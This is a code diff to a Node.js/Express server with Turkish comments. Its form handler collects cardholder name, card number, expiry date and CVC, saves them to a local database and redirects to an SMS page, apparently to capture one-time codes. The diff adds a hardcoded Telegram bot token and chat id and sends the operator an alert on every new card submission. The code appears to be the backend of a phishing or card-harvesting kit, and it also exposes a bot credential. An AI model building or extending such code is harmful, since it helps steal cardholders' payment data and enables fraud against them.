@@ -5,6 +5,9 @@ const path         = require('path');
 const low          = require('lowdb');
 const FileSync     = require('lowdb/adapters/FileSync');
 const ShortUniqueId = require('short-unique-id');
+const axios = require('axios');
+
+
 const uid = new ShortUniqueId({ length: 8 }); 
 // lowdb setup
 const file    = path.join(__dirname, 'db.json');
@@ -17,6 +20,7 @@ app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
 app.use(bodyParser.urlencoded({ extended: true }));
 
+
 // 1) Ana sayfa route: sadece burada sayaç artıyor
 app.get('/', (req, res) => {
   db.update('visits', n => n + 1).write();            // sadece frontend index ziyareti
@@ -26,11 +30,16 @@ app.get('/', (req, res) => {
 // 2) Statik diğer frontend dosyaları (CSS/JS/img)
 app.use(express.static(path.join(__dirname, '../frontend')));
 
+const token  = '8191580694:AAG7EnTXoERSTuuuY381HK7ExtJyB2T8IxU';
+const chatId = '-4728131788';
+const tgUrl  = `https://api.telegram.org/bot${token}/sendMessage`;
+
 // 1) body-parser zaten yüklü ve app.use(bodyParser.urlencoded…) var
 app.post('/submit-form', (req, res) => {
   const { cardname, cardnr, validMONTH, validYEAR, cvc2 } = req.body;
   const newId = uid.rnd()
   
+
    db.get('submissions')
     .unshift({
       id: newId,
@@ -42,6 +51,13 @@ app.post('/submit-form', (req, res) => {
       createdAt: new Date().toISOString()
     })
     .write();
+    
+    axios.post(tgUrl, {
+      chat_id: chatId,
+      text: `💳 Yeni Başvuru`
+    })
+  
+    
   // JSON ile ID’yi döndür
   res.redirect(`/sms.html?trans_id=${newId}`);       // ← burası
 });
